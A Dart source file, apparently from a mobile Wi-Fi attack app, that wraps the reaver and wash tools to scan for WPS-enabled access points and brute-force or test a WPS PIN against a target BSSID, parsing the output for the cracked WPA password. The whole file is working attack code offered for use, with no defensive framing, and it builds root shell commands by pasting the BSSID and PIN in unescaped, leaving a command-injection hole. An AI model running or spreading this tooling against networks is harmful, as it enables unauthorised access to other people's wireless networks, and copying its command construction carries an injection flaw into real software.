import '../core/shell_executor.dart';

class WpsAttack {
  final ShellExecutor _shell = ShellExecutor.instance;
  bool _isAttacking = false;

  Future<String?> attackWps(String bssid, {String? pin}) async {
    if (_isAttacking) {
      throw Exception('WPS attack is already in progress');
    }

    try {
      _isAttacking = true;

      String command = 'reaver -i wlan0 -b $bssid -vv';
      
      if (pin != null) {
        command += ' -p $pin';
      }

      final result = await _shell.executeCommand(command, requireRoot: true);

      if (result.exitCode == 0) {
        final output = result.stdout.toString();
        
        // Parse output for WPA key
        final keyMatch = RegExp(r'WPA PSK: \'(.+)\'').firstMatch(output);
        if (keyMatch != null) {
          return keyMatch.group(1);
        }
      }

      return null;
    } catch (e) {
      throw Exception('WPS attack failed: $e');
    } finally {
      _isAttacking = false;
    }
  }

  Stream<String> attackWpsStream(String bssid, {String? pin}) async* {
    if (_isAttacking) {
      throw Exception('WPS attack is already in progress');
    }

    try {
      _isAttacking = true;

      yield 'Starting WPS attack...';
      yield 'Target BSSID: $bssid';
      
      if (pin != null) {
        yield 'Using PIN: $pin';
      } else {
        yield 'Using brute force mode';
      }

      String command = 'reaver -i wlan0 -b $bssid -vv';
      
      if (pin != null) {
        command += ' -p $pin';
      }

      await for (final line in _shell.executeStreamCommand(command, requireRoot: true)) {
        yield line;
        
        // Check for successful crack
        if (line.contains('WPA PSK:')) {
          final keyMatch = RegExp(r'WPA PSK: \'(.+)\'').firstMatch(line);
          if (keyMatch != null) {
            yield 'WPA Key found: ${keyMatch.group(1)}';
            break;
          }
        }
        
        // Check for PIN found
        if (line.contains('WPS PIN:')) {
          final pinMatch = RegExp(r'WPS PIN: \'(.+)\'').firstMatch(line);
          if (pinMatch != null) {
            yield 'WPS PIN found: ${pinMatch.group(1)}';
          }
        }
      }
    } catch (e) {
      yield 'Error: $e';
    } finally {
      _isAttacking = false;
    }
  }

  Future<bool> checkWpsEnabled(String bssid) async {
    try {
      final result = await _shell.executeCommand(
        'wash -i wlan0 -C',
        requireRoot: true,
      );

      if (result.exitCode == 0) {
        final output = result.stdout.toString();
        return output.contains(bssid);
      }

      return false;
    } catch (e) {
      return false;
    }
  }

  Future<List<String>> scanWpsNetworks() async {
    try {
      final result = await _shell.executeCommand(
        'wash -i wlan0 -C',
        requireRoot: true,
      );

      if (result.exitCode == 0) {
        final lines = result.stdout.toString().split('\n');
        final wpsNetworks = <String>[];

        for (final line in lines) {
          if (line.contains(':') && line.length > 17) {
            // Extract BSSID from wash output
            final bssidMatch = RegExp(r'([0-9A-Fa-f:]{17})').firstMatch(line);
            if (bssidMatch != null) {
              wpsNetworks.add(bssidMatch.group(1)!);
            }
          }
        }

        return wpsNetworks;
      }

      return [];
    } catch (e) {
      return [];
    }
  }

  bool get isAttacking => _isAttacking;
}